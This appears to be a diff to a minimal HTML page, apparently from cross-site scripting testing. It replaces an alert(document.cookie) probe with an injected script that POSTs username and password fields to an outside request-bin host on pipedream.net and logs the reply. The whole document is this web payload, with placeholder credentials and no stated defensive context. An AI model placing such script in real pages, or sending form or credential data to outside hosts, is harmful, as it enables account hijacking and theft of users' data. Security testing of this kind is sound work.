@@ -1,6 +1,20 @@
 <html>
 <body>
 Hello
-<script>alert(document.cookie);</script>
+<script>
+  let xhr = new XMLHttpRequest();
+  xhr.open("POST", "https://en57bmh9jnvl.x.pipedream.net/test");
+  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+  xhr.onreadystatechange = function () {
+    if (xhr.readyState === 4) {
+      console.log(xhr.status);
+      console.log(xhr.responseText);
+    }};
+
+  let data = 'username=testtest&password=testtest&passwordConfirm=testtest'
+
+  xhr.send(data);
+</script>
 </body>
 </html>
